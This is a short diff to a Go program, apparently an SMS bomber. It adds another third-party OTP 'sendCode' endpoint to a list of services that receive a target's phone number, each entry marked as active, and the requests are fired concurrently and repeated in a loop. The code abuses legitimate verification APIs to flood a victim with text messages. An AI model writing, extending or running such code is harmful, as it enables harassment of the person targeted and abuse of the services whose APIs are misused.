@@ -202,7 +202,9 @@ func main() {
 		go sms("https://tap33.me/api/v2/user", map[string]interface{}{
 			"phoneNumber": phone,
 		}, ch) //active ✅
-
+		go sms("https://uiapi2.saapa.ir/api/otp/sendCode", map[string]interface{}{
+			"mobile": phone,
+		}, ch) //active ✅
 
 	for i := 0; i < repeatCount; i++ {
 		statusCode := <-ch
